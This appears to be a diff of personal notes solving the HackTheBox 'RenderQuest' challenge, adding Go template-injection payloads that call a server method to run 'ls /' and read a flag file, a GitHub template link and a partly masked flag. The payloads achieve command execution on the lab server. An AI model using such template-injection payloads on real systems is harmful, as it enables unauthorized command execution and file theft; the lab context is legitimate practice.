@@ -1,3 +1,5 @@
+RenderQuest
+
 <!DOCTYPE html>
 <html>
 <head>
@@ -32,3 +34,17 @@
     </ul>
 </body>
 </html>
+
+ <h3>Get Flag</h3>
+    <ul>
+        <li>Flag: {{.FetchServerInfo "ls /"}}</li>
+    </ul>
+
+h3>Get Flag</h3>
+    <ul>
+        <li>Flag: {{.FetchServerInfo "cat .flagc367189f45.txt"}}</li>
+    </ul>
+
+https://eliztherock.github.io/htbtmps.html  - | usando plantilla de github
+
+Flag: HTB{qu35t_f0r_th3_*******************!!}
